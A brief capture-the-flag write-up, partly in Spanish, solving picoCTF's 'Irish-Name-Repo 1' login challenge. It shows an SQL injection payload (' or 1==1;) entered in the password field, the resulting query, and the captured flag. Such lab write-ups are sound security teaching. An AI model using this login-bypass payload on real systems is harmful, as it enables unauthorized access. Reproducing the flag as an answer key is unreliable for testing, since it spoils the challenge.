##  Irish-Name-Repo 1

### Objetivos 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

### Pistas
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

### Solución 

- activamos el campo de debug desde las herramientas de desarrollador para ver las sentencias sql.

- hacemos una inyeccion SQL:
colocamos el username admin y en la contraseña ponemos una condición que siempre se cumpla, como 1=1 para iniciar sesion
``` bash

username: admin 
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin ' AND password='' or 1==1;'

---

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```


```
### Notas adicionales:



### Referencias:
sql injection:  https://www.imperva.com/learn/application-security/sql-injection-sqli/#:~:text=SQL%20injection%2C%20also%20known%20as,not%20intended%20to%20be%20displayed.